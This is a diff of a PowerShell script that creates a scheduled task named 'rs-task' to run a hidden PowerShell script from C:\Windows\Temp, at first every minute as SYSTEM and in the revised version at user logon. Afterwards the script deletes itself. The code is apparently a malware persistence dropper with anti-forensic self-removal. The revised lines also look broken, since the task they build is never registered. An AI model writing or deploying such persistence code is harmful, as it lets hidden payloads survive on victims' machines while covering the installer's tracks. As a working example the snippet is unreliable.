@@ -6,7 +6,11 @@ if($taskExists) {
    Write-Output "EXISTS";
 } else {
    Write-Output "Creating task...";
-   C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru System
+   #C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru System
+   $action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\rs_sl.ps1"
+   $trigger = New-ScheduledTaskTrigger -AtLogOn
+   $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance –ClassName Win32_ComputerSystem | Select-Object -expand UserName)
+   $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
 }
 
 Remove-Item $script:MyInvocation.MyCommand.Path -Force
